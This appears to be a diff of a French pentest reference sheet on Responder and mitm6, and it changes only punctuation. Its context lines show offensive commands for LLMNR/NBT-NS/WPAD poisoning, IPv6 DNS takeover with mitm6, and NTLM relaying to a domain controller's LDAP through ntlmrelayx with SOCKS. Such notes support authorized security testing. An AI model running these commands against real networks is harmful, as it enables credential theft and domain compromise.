@@ -1,4 +1,4 @@
-# Responder & mitm6 — Référence complète
+# Responder & mitm6 : Référence complète
 
 ---
 
@@ -34,7 +34,7 @@ sudo responder -I $IFACE -rdw
 # -r    Répondre aux requêtes NBT-NS pour noms NetBIOS
 # -d    Répondre aux requêtes DHCP
 # -w    Démarrer le serveur WPAD (proxy auto-discovery)
-# -A    Mode analyse (passive — ne répond pas)
+# -A    Mode analyse (passive : ne répond pas)
 # -v    Mode verbeux
 ```
 
@@ -107,7 +107,7 @@ ntlmrelayx.py -6 -socks -t ldap://$DC_IP -smb2support \
               -tf ~/certif/targets_relay.txt
 ```
 
-### Mode SOCKS — Utilisation via proxychains
+### Mode SOCKS : Utilisation via proxychains
 
 ```bash
 # Dans ntlmrelayx, taper "socks" pour voir les relais actifs
@@ -144,7 +144,7 @@ mitm6 peut rediriger les authentifications NTLM vers ntlmrelayx
 ### Lancement
 
 ```bash
-# Terminal 1 — mitm6
+# Terminal 1 : mitm6
 sudo mitm6 -d $DOMAIN_FQDN -i $IFACE
 
 # Options :
